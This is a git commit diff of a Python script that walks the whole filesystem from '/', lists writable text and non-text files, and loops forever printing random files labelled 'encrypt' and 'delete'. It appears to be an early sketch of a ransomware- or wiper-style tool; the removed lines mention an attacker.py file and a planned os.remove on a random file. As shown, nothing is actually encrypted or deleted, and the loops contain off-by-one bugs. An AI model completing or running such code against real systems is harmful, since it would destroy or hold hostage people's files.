810f0ad6ecbcd334de2ae8e33b20d8437300d5e2
karimPrograms <78750964+karimPrograms@users.noreply.github.com>
2022-10-23 17:05:48 +0100

    Update browsedirectories.py

--- browsedirectories.py
+++ browsedirectories.py
@@ -1,14 +1,19 @@
 import os
 import random
+import pathlib
+import time
 import colorama
-from colorama import Fore, Back, Style #just to color the results in the terminal
-colorama.init() 
+from colorama import Fore, Back, Style
+colorama.init()
+  
+############################################################################################################################################################
 
 Files_Table = [] #a table contaning all writable files
 Text_Files_Table = [] #a table contaning all writable TEXT files
-theroot = "none"#just to check if we have a root file in a directory
+NonText_Files_Table = []#a table contaning all writable Non-TEXT files
+theroot = "none" #just to check if we have a root file in a directory
 
-for (root,dirs,files) in os.walk('/home/kali/Desktop/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
+for (root,dirs,files) in os.walk('/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
 	print(files) #print all the files found in that directory
 	print ('--------------------------------')
 	
@@ -16,27 +21,42 @@ for (root,dirs,files) in os.walk('/home/kali/Desktop/', topdown=True): #goes thr
 		path = os.path.join(root, file) #this part is to save a root file if found (just for testing, will be removed later)
 		if os.path.isfile(path) == True:
 			if os.stat(path).st_uid == 0:
-				theroot = os.stat(path).st_uid
+				theroot = os.stat(path)
 			
-		if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be opened, we ignore it
+		if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be open we ignore it
 		else:
 			if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
 				Files_Table.append(path) #put all writable files in the list
 				if(pathlib.Path(path).suffix == ".txt"):
 					Text_Files_Table.append(path) #put all writable TEXT files in the list	
 				
-
+for i in range(0,(len(Files_Table)-1)):
+	trouve = False
+	j=0
+	while((trouve == False) and (j<len(Text_Files_Table)-1)):
+		if (Files_Table[i] == Text_Files_Table[j]):
+			trouve = True
+		j=j+1
+	if trouve == False:
+		NonText_Files_Table.append(Files_Table[i])
 
 print(Fore.BLUE+ "these are to modifiable files: ")				
 print(Files_Table)
 print(Fore.CYAN+ "these are to TEXT modifiable files: ")				
-print(Files_Table)
-print(Fore.GREEN + "the root is " + theroot)
+print(Text_Files_Table)
+print(Fore.RED+ "these are to Non-TEXT modifiable files: ")				
+print(NonText_Files_Table)
+print(Fore.GREEN + "one of the root files " + str(theroot))
 
 
-randomFile = Files_Table[random.randint(0,len(Files_Table)) - 1]
-while randomFile == '/home/kali/Desktop/attacker.py':
-	randomFile = Files_Table[random.randint(0,len(Files_Table)) - 1]
-	
-#selma's code with randomeFile
-#for example: os.remove(randomFile)
+while True:
+	randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
+	randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
+	randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
+
+	print("encrypt: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
+	time.sleep(5)
+	print("delete: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
+	time.sleep(5)
+	print("add file: " +  str(randomeNumberOfFiles))
+   
